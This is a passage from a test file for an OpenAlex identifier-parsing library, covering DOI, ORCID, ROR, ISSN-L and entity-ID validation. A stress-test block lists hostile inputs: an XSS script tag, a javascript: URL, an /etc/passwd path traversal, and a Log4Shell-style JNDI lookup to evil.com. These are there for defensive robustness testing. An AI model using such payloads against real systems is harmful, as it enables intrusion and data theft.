      '0123abc45',  // Valid format
      '0zzzzzz99'   // Valid format
    ];
    
    validRors.forEach(ror => {
      expect(isValidAnyId(ror)).toBe(true);
      expect(parseExternalId(ror).idType).toBe(ExternalIdType.ROR);
    });
    
    // Invalid ROR IDs
    const invalidRors = [
      '3yrm5c26',      // Missing leading zero
      '03yrm5c267',    // Too long
      '03yrm5c2',      // Too short
      '03YRM5C26',     // Should be lowercase
      '03yrm5c2g',     // Invalid character in numeric position
      'g3yrm5c26'      // Invalid character in first position
    ];
    
    invalidRors.forEach(ror => {
      expect(isValidAnyId(ror)).toBe(false);
    });
  });

  it('should validate ISSN-L formats comprehensively', () => {
    // Valid ISSN-L formats
    const validIssns = [
      '0028-0836',  // Nature
      '1234-567X',  // X checksum
      '0000-0000',  // All zeros
      '9999-999X'   // Maximum values
    ];
    
    validIssns.forEach(issn => {
      expect(isValidAnyId(issn)).toBe(true);
      expect(parseExternalId(issn).idType).toBe(ExternalIdType.ISSN_L);
    });
    
    // Invalid ISSN-L formats
    const invalidIssns = [
      '028-0836',    // Missing digit
      '0028-08366',  // Extra digit
      '0028_0836',   // Wrong separator
      '0028-083Y',   // Invalid checksum
      'XXXX-XXXX'    // All letters
    ];
    
    invalidIssns.forEach(issn => {
      expect(isValidAnyId(issn)).toBe(false);
    });
  });

  it('should handle DOI format variations', () => {
    // Standard DOI formats
    const standardDois = [
      '10.1038/nature12373',
      '10.1371/journal.pone.0123456',
      '10.1016/j.cell.2020.01.023'
    ];
    
    standardDois.forEach(doi => {
      expect(isValidAnyId(doi)).toBe(true);
      expect(parseExternalId(doi).idType).toBe(ExternalIdType.DOI);
    });
    
    // DOI with complex paths
    const complexDois = [
      '10.1000/123456',
      '10.9999/very.complex.doi.with.many.dots',
      '10.1234/doi-with-dashes',
      '10.5678/doi_with_underscores',
      '10.1111/doi(with)parentheses'
    ];
    
    complexDois.forEach(doi => {
      expect(isValidAnyId(doi)).toBe(true);
      expect(parseExternalId(doi).idType).toBe(ExternalIdType.DOI);
    });
    
    // Invalid DOI formats
    const invalidDois = [
      '10/missing-registry',     // Missing registry code
      '9.1234/invalid-prefix',   // Invalid prefix format
      '10./missing-registrant',  // Missing registrant
      '10.1234/',               // Missing suffix
      'doi-without-prefix'       // No 10. prefix
    ];
    
    invalidDois.forEach(doi => {
      expect(isValidAnyId(doi)).toBe(false);
    });
  });
});

describe('Cross-reference and entity relationship tests', () => {
  it('should correctly map external ID types to entity types', () => {
    // Test definitive mappings (1:1)
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.DOI)).toEqual([EntityType.WORK]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ORCID)).toEqual([EntityType.AUTHOR]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ROR)).toEqual([EntityType.INSTITUTION]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ISSN_L)).toEqual([EntityType.SOURCE]);
    
    // Test non-definitive mappings (1:many)
    const wikidataTypes = getPossibleEntityTypesForExternalId(ExternalIdType.WIKIDATA);
    expect(wikidataTypes).toContain(EntityType.PUBLISHER);
    expect(wikidataTypes).toContain(EntityType.FUNDER);
    expect(wikidataTypes).toContain(EntityType.TOPIC);
    expect(wikidataTypes).toContain(EntityType.CONCEPT);
    expect(wikidataTypes).toContain(EntityType.CONTINENT);
    expect(wikidataTypes).toContain(EntityType.REGION);
    expect(wikidataTypes.length).toBe(6);
    
    // Test OpenAlex mapping (supports all entity types)
    const openalexTypes = getPossibleEntityTypesForExternalId(ExternalIdType.OPENALEX);
    expect(openalexTypes.length).toBe(Object.values(EntityType).length);
  });

  it('should validate entity type support for external IDs', () => {
    // Works support DOI and OpenAlex
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.DOI)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.OPENALEX)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.ORCID)).toBe(false);
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.ROR)).toBe(false);
    
    // Authors support ORCID and OpenAlex
    expect(entitySupportsExternalIdType(EntityType.AUTHOR, ExternalIdType.ORCID)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.AUTHOR, ExternalIdType.OPENALEX)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.AUTHOR, ExternalIdType.DOI)).toBe(false);
    
    // Keywords only support OpenAlex
    expect(entitySupportsExternalIdType(EntityType.KEYWORD, ExternalIdType.OPENALEX)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.KEYWORD, ExternalIdType.DOI)).toBe(false);
    expect(entitySupportsExternalIdType(EntityType.KEYWORD, ExternalIdType.WIKIDATA)).toBe(false);
  });

  it('should handle entity resolution consistency', () => {
    // Test that resolution is consistent across different formats
    const doiFormats = [
      '10.7717/peerj.4375',
      'https://doi.org/10.7717/peerj.4375',
      'doi:10.7717/peerj.4375'
    ];
    
    doiFormats.forEach(format => {
      const result = resolveEntityFromId(format);
      expect(result.entityType).toBe(EntityType.WORK);
      expect(result.isDefinitive).toBe(true);
      expect(result.externalId?.cleanId).toBe('10.7717/peerj.4375');
    });
    
    const orcidFormats = [
      '0000-0003-1613-5981',
      'https://orcid.org/0000-0003-1613-5981',
      'orcid:0000-0003-1613-5981'
    ];
    
    orcidFormats.forEach(format => {
      const result = resolveEntityFromId(format);
      expect(result.entityType).toBe(EntityType.AUTHOR);
      expect(result.isDefinitive).toBe(true);
      expect(result.externalId?.cleanId).toBe('0000-0003-1613-5981');
    });
  });

  it('should test all entity endpoints mapping', () => {
    const allEntityTypes = getAllEntityTypes();
    
    allEntityTypes.forEach(entityType => {
      const endpoint = getEntityEndpoint(entityType);
      expect(endpoint).toBeDefined();
      expect(typeof endpoint).toBe('string');
      expect(endpoint.length).toBeGreaterThan(0);
      
      // Verify endpoint follows OpenAlex conventions (plural forms)
      expect(endpoint.endsWith('s')).toBe(true);
    });
    
    // Test specific known endpoints
    expect(getEntityEndpoint(EntityType.WORK)).toBe('works');
    expect(getEntityEndpoint(EntityType.AUTHOR)).toBe('authors');
    expect(getEntityEndpoint(EntityType.SOURCE)).toBe('sources');
    expect(getEntityEndpoint(EntityType.INSTITUTION)).toBe('institutions');
    expect(getEntityEndpoint(EntityType.PUBLISHER)).toBe('publishers');
    expect(getEntityEndpoint(EntityType.FUNDER)).toBe('funders');
    expect(getEntityEndpoint(EntityType.TOPIC)).toBe('topics');
    expect(getEntityEndpoint(EntityType.CONCEPT)).toBe('concepts');
    expect(getEntityEndpoint(EntityType.KEYWORD)).toBe('keywords');
    expect(getEntityEndpoint(EntityType.CONTINENT)).toBe('continents');
    expect(getEntityEndpoint(EntityType.REGION)).toBe('regions');
  });
});

describe('Performance and batch operations', () => {
  it('should handle large text extraction efficiently', () => {
    // Create a large text with many entity IDs
    const entityIds = [
      'W2741809807', 'A2887492', 'S12345678', 'I87654321',
      'https://openalex.org/W1111111111', 'https://openalex.org/A2222222222'
    ];
    
    const largeText = entityIds.join(' ').repeat(100); // 600 IDs total
    
    const start = performance.now();
    const results = extractEntityIdentifiers(largeText);
    const end = performance.now();
    
    // Note: extractEntityIdentifiers may handle URLs differently, expect approximately 500-600 results
    expect(results.length).toBeGreaterThan(500);
    expect(results.length).toBeLessThanOrEqual(600);
    expect(end - start).toBeLessThan(1000); // Should complete within 1 second
    
    // Verify results are sorted by position
    for (let i = 1; i < results.length; i++) {
      expect(results[i].start).toBeGreaterThanOrEqual(results[i - 1].start);
    }
  });

  it('should handle batch validation efficiently', () => {
    const testIds = [
      'W2741809807', '10.7717/peerj.4375', '0000-0003-1613-5981',
      'https://doi.org/10.1038/nature12373', 'Q123456', '03yrm5c26',
      'invalid-id', '', 'https://invalid-url.com'
    ].concat(Array.from({ length: 1000 }, (_, i) => `W${1000000 + i}`));
    
    const start = performance.now();
    const validationResults = testIds.map(id => isValidAnyId(id));
    const end = performance.now();
    
    expect(validationResults.length).toBe(testIds.length);
    expect(end - start).toBeLessThan(500); // Should be very fast
    
    // Count valid vs invalid
    const validCount = validationResults.filter(Boolean).length;
    expect(validCount).toBeGreaterThan(1000); // Most generated IDs should be valid
  });

  it('should handle memory efficiently with large datasets', () => {
    const largeDataset = Array.from({ length: 10000 }, (_, i) => ({
      openalexId: `W${1000000 + i}`,
      doi: `10.1000/${i}`,
      orcid: `0000-000${String(i).padStart(1, '0')}-0000-000${String(i % 10)}`
    }));
    
    // This should not cause memory issues
    largeDataset.forEach(item => {
      expect(isValidAnyId(item.openalexId)).toBe(true);
      expect(isValidAnyId(item.doi)).toBe(true);
      // Note: Most generated ORCIDs will be invalid due to format constraints
    });
    
    // Test memory is released (this is more of a smoke test)
    expect(largeDataset.length).toBe(10000);
  });
});

describe('Malformed input stress testing', () => {
  it('should handle malicious input attempts', () => {
    const maliciousInputs = [
      '"><script>alert("xss")</script>',
      'javascript:alert(1)',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '%00%00%00%00',
      '\x00\x01\x02\x03',
      Array(100000).fill('A').join(''), // Very long string
      '10.'.repeat(10000), // Repeated DOI prefix
      'https://'.repeat(1000), // Repeated URL scheme
    ];
    
    maliciousInputs.forEach(input => {
      expect(() => {
        // These should either return false or throw EntityDetectionError
        const result = isValidAnyId(input);
        expect(typeof result).toBe('boolean');
      }).not.toThrow(); // Should not throw unexpected errors
    });
  });

  it('should handle extreme boundary cases', () => {
    const extremeCases = [
      '', // Empty string
      ' '.repeat(1000), // Only whitespace
      '\n\t\r\f\v', // Various whitespace characters
      '...', // Only dots
      '///', // Only slashes
      '000000000000000000000', // Many zeros
      'WWWWWWWWWWWWWWWWWWWWW', // Many W's
      '10.' + 'x'.repeat(100000), // Extremely long DOI
      '0000-0000-0000-' + '0'.repeat(100), // Malformed ORCID
    ];
    
    extremeCases.forEach(input => {
      expect(() => {
        const result = isValidAnyId(input);
        expect(typeof result).toBe('boolean');
        if (result) {
          // If it's valid, we should be able to resolve it
          const resolved = resolveEntityFromId(input);
          expect(resolved).toBeDefined();
        }
      }).not.toThrow();
    });
  });

  it('should handle Unicode and international characters', () => {
    const unicodeInputs = [
      '10.1000/tëst', // DOI with accented characters
      '10.1000/测试', // DOI with Chinese characters
      '10.1000/тест', // DOI with Cyrillic characters
      'W274180980𝟕', // OpenAlex ID with mathematical bold digit
      '0000-0003-1613-598🔢', // ORCID with emoji
      'Q12345𝟔', // Wikidata with mathematical digit
    ];
    
    unicodeInputs.forEach(input => {
      // These may or may not be valid, but should not crash
      expect(() => {
        const result = isValidAnyId(input);
        expect(typeof result).toBe('boolean');
      }).not.toThrow();
    });
  });

  it('should handle normalization edge cases', () => {
    const normalizationTests = [
      { input: 'W2741809807', expected: 'W2741809807' },
      { input: '  W2741809807  ', expected: 'W2741809807' },
      { input: 'w2741809807', expected: 'W2741809807' },
      { input: 'https://openalex.org/W2741809807', expected: 'W2741809807' },
    ];
    
    normalizationTests.forEach(({ input, expected }) => {
      try {
        const result = normalizeAnyId(input);
        expect(result).toBe(expected);
      } catch (error) {
        // Some inputs may legitimately fail normalization
        expect(error).toBeInstanceOf(EntityDetectionError);
      }
    });
  });
});

describe('Real-world OpenAlex entity examples and validation', () => {
  it('should handle real Work entities with various patterns', () => {
    const realWorkExamples = [
      'W2741809807', // Actual OpenAlex work
      'W123456789',  // Minimum length work
      'W1234567890', // Maximum length work
      'https://openalex.org/W2950924907', // URL format
      'https://openalex.org/W2963829925'  // Another real work
    ];

    realWorkExamples.forEach(workId => {
      expect(isValidEntityIdentifier(workId)).toBe(true);
      const parsed = parseEntityIdentifier(workId);
      expect(parsed.type).toBe(EntityType.WORK);
      expect(parsed.prefix).toBe('W');
      expect(getEntityEndpoint(parsed.type)).toBe('works');
    });
  });

  it('should handle real Author entities with various patterns', () => {
    const realAuthorExamples = [
      'A2887492',    // Real author
      'A1234567',    // Minimum length
      'A1234567890', // Maximum length
      'https://openalex.org/A2887492',
      'a2887492'     // Lowercase (should normalize)
    ];

    realAuthorExamples.forEach(authorId => {
      expect(isValidEntityIdentifier(authorId)).toBe(true);
      const parsed = parseEntityIdentifier(authorId);
      expect(parsed.type).toBe(EntityType.AUTHOR);
      expect(parsed.prefix).toBe('A');
      expect(getEntityEndpoint(parsed.type)).toBe('authors');
    });
  });

  it('should handle real Source entities (journals, conferences)', () => {
    const realSourceExamples = [
      'S137773608',  // Nature journal
      'S1983995261', // PLOS ONE
      'S1990187', // PubMed
      'https://openalex.org/S137773608',
      's137773608'   // Lowercase
    ];

    realSourceExamples.forEach(sourceId => {
      expect(isValidEntityIdentifier(sourceId)).toBe(true);
      const parsed = parseEntityIdentifier(sourceId);
      expect(parsed.type).toBe(EntityType.SOURCE);
      expect(parsed.prefix).toBe('S');
      expect(getEntityEndpoint(parsed.type)).toBe('sources');
    });
  });

  it('should handle real Institution entities', () => {
    const realInstitutionExamples = [
      'I145311948',  // Harvard University
      'I86269608',   // Stanford University
      'I27837315',   // University of Oxford
      'https://openalex.org/I145311948',
      'i145311948'   // Lowercase
    ];

    realInstitutionExamples.forEach(institutionId => {
      expect(isValidEntityIdentifier(institutionId)).toBe(true);
      const parsed = parseEntityIdentifier(institutionId);
      expect(parsed.type).toBe(EntityType.INSTITUTION);
      expect(parsed.prefix).toBe('I');
      expect(getEntityEndpoint(parsed.type)).toBe('institutions');
    });
  });

  it('should handle real Publisher entities', () => {
    const realPublisherExamples = [
      'P4310319962', // Elsevier
      'P4310315808', // Springer
      'P4310320595', // Wiley
      'https://openalex.org/P4310319962',
      'p4310319962'  // Lowercase
    ];

    realPublisherExamples.forEach(publisherId => {
      expect(isValidEntityIdentifier(publisherId)).toBe(true);
      const parsed = parseEntityIdentifier(publisherId);
      expect(parsed.type).toBe(EntityType.PUBLISHER);
      expect(parsed.prefix).toBe('P');
      expect(getEntityEndpoint(parsed.type)).toBe('publishers');
    });
  });

  it('should handle real Funder entities', () => {
    const realFunderExamples = [
      'F4320306076', // NIH
      'F4320306421', // NSF
      'F4320317839', // European Research Council
      'https://openalex.org/F4320306076',
      'f4320306076'  // Lowercase
    ];

    realFunderExamples.forEach(funderId => {
      expect(isValidEntityIdentifier(funderId)).toBe(true);
      const parsed = parseEntityIdentifier(funderId);
      expect(parsed.type).toBe(EntityType.FUNDER);
      expect(parsed.prefix).toBe('F');
      expect(getEntityEndpoint(parsed.type)).toBe('funders');
    });
  });

  it('should handle real Topic entities', () => {
    const realTopicExamples = [
      'T1234567',      // Valid 7-digit topic
      'T12345678',     // Valid 8-digit topic
      'T123456789',    // Valid 9-digit topic
      'https://openalex.org/T1234567',
      't1234567'       // Lowercase
    ];

    realTopicExamples.forEach(topicId => {
      expect(isValidEntityIdentifier(topicId)).toBe(true);
      const parsed = parseEntityIdentifier(topicId);
      expect(parsed.type).toBe(EntityType.TOPIC);
      expect(parsed.prefix).toBe('T');
      expect(getEntityEndpoint(parsed.type)).toBe('topics');
    });
  });

  it('should handle real Concept entities (legacy)', () => {
    const realConceptExamples = [
      'C121332964',  // Biology
      'C41008148',   // Computer Science
      'C134306372',  // Medicine
      'https://openalex.org/C121332964',
      'c121332964'   // Lowercase
    ];

    realConceptExamples.forEach(conceptId => {
      expect(isValidEntityIdentifier(conceptId)).toBe(true);
      const parsed = parseEntityIdentifier(conceptId);
      expect(parsed.type).toBe(EntityType.CONCEPT);
      expect(parsed.prefix).toBe('C');
      expect(getEntityEndpoint(parsed.type)).toBe('concepts');
    });
  });

  it('should handle Keyword entities', () => {
    const keywordExamples = [
      'K12345678',   // Sample keyword
      'K987654321',  // Another keyword
      'https://openalex.org/K12345678',
      'k12345678'    // Lowercase
    ];

    keywordExamples.forEach(keywordId => {
      expect(isValidEntityIdentifier(keywordId)).toBe(true);
      const parsed = parseEntityIdentifier(keywordId);
      expect(parsed.type).toBe(EntityType.KEYWORD);
      expect(parsed.prefix).toBe('K');
      expect(getEntityEndpoint(parsed.type)).toBe('keywords');
    });
  });

  it('should handle Continent entities', () => {
    const continentExamples = [
      'N12345678',   // Sample continent
      'N987654321',  // Another continent
      'https://openalex.org/N12345678',
      'n12345678'    // Lowercase
    ];

    continentExamples.forEach(continentId => {
      expect(isValidEntityIdentifier(continentId)).toBe(true);
      const parsed = parseEntityIdentifier(continentId);
      expect(parsed.type).toBe(EntityType.CONTINENT);
      expect(parsed.prefix).toBe('N');
      expect(getEntityEndpoint(parsed.type)).toBe('continents');
    });
  });

  it('should handle Region entities', () => {
    const regionExamples = [
      'R12345678',   // Sample region
      'R987654321',  // Another region
      'https://openalex.org/R12345678',
      'r12345678'    // Lowercase
    ];

    regionExamples.forEach(regionId => {
      expect(isValidEntityIdentifier(regionId)).toBe(true);
      const parsed = parseEntityIdentifier(regionId);
      expect(parsed.type).toBe(EntityType.REGION);
      expect(parsed.prefix).toBe('R');
      expect(getEntityEndpoint(parsed.type)).toBe('regions');
    });
  });

  it('should validate URL generation for all entity types', () => {
    const entityExamples = [
      { id: 'W2741809807', type: EntityType.WORK },
      { id: 'A12887492', type: EntityType.AUTHOR },
      { id: 'S137773608', type: EntityType.SOURCE },
      { id: 'I145311948', type: EntityType.INSTITUTION },
      { id: 'P4310319962', type: EntityType.PUBLISHER },
      { id: 'F4320306076', type: EntityType.FUNDER },
      { id: 'T1234567', type: EntityType.TOPIC },
      { id: 'C121332964', type: EntityType.CONCEPT },
      { id: 'K12345678', type: EntityType.KEYWORD },
      { id: 'N12345678', type: EntityType.CONTINENT },
      { id: 'R12345678', type: EntityType.REGION }
    ];

    entityExamples.forEach(({ id, type }) => {
      const url = generateEntityUrl(id);
      expect(url).toBe(`https://openalex.org/${id}`);
      
      // Test URL parsing back
      const parsed = parseOpenAlexUrl(url);
      expect(parsed.type).toBe(type);
      expect(parsed.id).toBe(id);
      expect(parsed.fromUrl).toBe(true);
    });
  });
});

describe('Schema compliance and type validation tests', () => {
  it('should validate EntityType enum values match expected schema', () => {
    const expectedEntityTypes = [
      'work', 'author', 'source', 'institution', 'publisher',
      'funder', 'topic', 'concept', 'keyword', 'continent', 'region'
    ];
    
    const actualEntityTypes = Object.values(EntityType);
    expect(actualEntityTypes).toEqual(expectedEntityTypes);
    expect(actualEntityTypes.length).toBe(11);
    
    // Ensure no duplicates
    const uniqueTypes = new Set(actualEntityTypes);
    expect(uniqueTypes.size).toBe(actualEntityTypes.length);
  });

  it('should validate ExternalIdType enum values match expected schema', () => {
    const expectedExternalIdTypes = [
      'doi', 'orcid', 'ror', 'issn-l', 'wikidata', 'openalex'
    ];
    
    const actualExternalIdTypes = Object.values(ExternalIdType);
    expect(actualExternalIdTypes).toEqual(expectedExternalIdTypes);
    expect(actualExternalIdTypes.length).toBe(6);
    
    // Ensure no duplicates
    const uniqueTypes = new Set(actualExternalIdTypes);
    expect(uniqueTypes.size).toBe(actualExternalIdTypes.length);
  });

  it('should validate prefix mappings are bidirectional and consistent', () => {
    const entityTypes = Object.values(EntityType);
    const prefixes = Object.keys(ENTITY_PREFIXES);
    
    // Every entity type should have a prefix
    entityTypes.forEach(entityType => {
      const prefix = TYPE_TO_PREFIX[entityType];
      expect(prefix).toBeDefined();
      expect(typeof prefix).toBe('string');
      expect(prefix.length).toBe(1);
      expect(prefixes).toContain(prefix);
    });
    
    // Every prefix should map to an entity type
    prefixes.forEach(prefix => {
      const entityType = ENTITY_PREFIXES[prefix];
      expect(entityType).toBeDefined();
      expect(entityTypes).toContain(entityType);
    });
    
    // Bidirectional consistency
    entityTypes.forEach(entityType => {
      const prefix = TYPE_TO_PREFIX[entityType];
      expect(ENTITY_PREFIXES[prefix]).toBe(entityType);
    });
  });

  it('should validate endpoint mappings are complete and follow conventions', () => {
    const entityTypes = Object.values(EntityType);
    
    entityTypes.forEach(entityType => {
      const endpoint = ENTITY_ENDPOINTS[entityType];
      expect(endpoint).toBeDefined();
      expect(typeof endpoint).toBe('string');
      expect(endpoint.length).toBeGreaterThan(0);
      
      // Should be plural form
      expect(endpoint.endsWith('s')).toBe(true);
      
      // Should not contain special characters
      expect(/^[a-z]+s$/.test(endpoint)).toBe(true);
    });
    
    // Check specific known mappings
    expect(ENTITY_ENDPOINTS[EntityType.WORK]).toBe('works');
    expect(ENTITY_ENDPOINTS[EntityType.AUTHOR]).toBe('authors');
    expect(ENTITY_ENDPOINTS[EntityType.SOURCE]).toBe('sources');
  });

  it('should validate external ID mappings are complete and logical', () => {
    const entityTypes = Object.values(EntityType);
    const externalIdTypes = Object.values(ExternalIdType);
    
    // Every entity type should have at least OpenAlex support
    entityTypes.forEach(entityType => {
      const supportedIds = ENTITY_EXTERNAL_ID_MAPPINGS[entityType];
      expect(supportedIds).toBeDefined();
      expect(Array.isArray(supportedIds)).toBe(true);
      expect(supportedIds).toContain(ExternalIdType.OPENALEX);
    });
    
    // Validate specific known mappings
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.WORK]).toContain(ExternalIdType.DOI);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.AUTHOR]).toContain(ExternalIdType.ORCID);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.INSTITUTION]).toContain(ExternalIdType.ROR);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.SOURCE]).toContain(ExternalIdType.ISSN_L);
    
    // Validate Wikidata mappings
    const wikidataEntities = [EntityType.PUBLISHER, EntityType.FUNDER, EntityType.TOPIC, 
                             EntityType.CONCEPT, EntityType.CONTINENT, EntityType.REGION];
    wikidataEntities.forEach(entityType => {
      expect(ENTITY_EXTERNAL_ID_MAPPINGS[entityType]).toContain(ExternalIdType.WIKIDATA);
    });
  });

  it('should validate type guard functions work correctly', () => {
    // Valid entity types
    Object.values(EntityType).forEach(entityType => {
      expect(isEntityType(entityType)).toBe(true);
    });
    
    // Invalid values
    expect(isEntityType('invalid')).toBe(false);
    expect(isEntityType('')).toBe(false);
    expect(isEntityType(null)).toBe(false);
    expect(isEntityType(undefined)).toBe(false);
    expect(isEntityType(123)).toBe(false);
    expect(isEntityType({})).toBe(false);
  });

  it('should validate interface compliance for parsed results', () => {
    const testId = 'W2741809807';
    const parsed = parseEntityIdentifier(testId);
    
    // Validate EntityParseResult interface
    expect(parsed).toHaveProperty('type');
    expect(parsed).toHaveProperty('id');
    expect(parsed).toHaveProperty('numericId');
    expect(parsed).toHaveProperty('prefix');
    expect(parsed).toHaveProperty('fromUrl');
    
    expect(typeof parsed.type).toBe('string');
    expect(typeof parsed.id).toBe('string');
    expect(typeof parsed.numericId).toBe('string');
    expect(typeof parsed.prefix).toBe('string');
    expect(typeof parsed.fromUrl).toBe('boolean');
    
    expect(Object.values(EntityType)).toContain(parsed.type);
    expect(parsed.id).toBe(testId);
    expect(parsed.numericId).toBe('2741809807');
    expect(parsed.prefix).toBe('W');
    expect(parsed.fromUrl).toBe(false);
  });

  it('should validate interface compliance for external ID parsing', () => {
    const testDoi = '10.7717/peerj.4375';
    const parsed = parseExternalId(testDoi);
    
    // Validate ExternalIdParseResult interface
    expect(parsed).toHaveProperty('idType');
    expect(parsed).toHaveProperty('cleanId');
    expect(parsed).toHaveProperty('originalInput');
    expect(parsed).toHaveProperty('fromUrl');
    expect(parsed).toHaveProperty('fromNamespace');
    expect(parsed).toHaveProperty('possibleEntityTypes');
    
    expect(typeof parsed.idType).toBe('string');
    expect(typeof parsed.cleanId).toBe('string');
    expect(typeof parsed.originalInput).toBe('string');
    expect(typeof parsed.fromUrl).toBe('boolean');
    expect(typeof parsed.fromNamespace).toBe('boolean');
    expect(Array.isArray(parsed.possibleEntityTypes)).toBe(true);
    
    expect(Object.values(ExternalIdType)).toContain(parsed.idType);
    expect(parsed.cleanId).toBe(testDoi);
    expect(parsed.originalInput).toBe(testDoi);
    expect(parsed.fromUrl).toBe(false);
    expect(parsed.fromNamespace).toBe(false);
    expect(parsed.possibleEntityTypes).toEqual([EntityType.WORK]);
  });

  it('should validate interface compliance for entity resolution', () => {
    const testId = 'W2741809807';
    const resolved = resolveEntityFromId(testId);
    
    // Validate IdResolutionResult interface
    expect(resolved).toHaveProperty('isDefinitive');
    expect(resolved).toHaveProperty('originalInput');
    
    expect(typeof resolved.isDefinitive).toBe('boolean');
    expect(typeof resolved.originalInput).toBe('string');
    
    if (resolved.entityType) {
      expect(Object.values(EntityType)).toContain(resolved.entityType);
    }
    
    if (resolved.openAlexId) {
      expect(typeof resolved.openAlexId).toBe('string');
    }
    
    if (resolved.externalId) {
      expect(resolved.externalId).toHaveProperty('idType');
      expect(resolved.externalId).toHaveProperty('cleanId');
      expect(resolved.externalId).toHaveProperty('possibleEntityTypes');
    }
    
    expect(resolved.originalInput).toBe(testId);
    expect(resolved.isDefinitive).toBe(true);
    expect(resolved.entityType).toBe(EntityType.WORK);
    expect(resolved.openAlexId).toBe(testId);
  });
});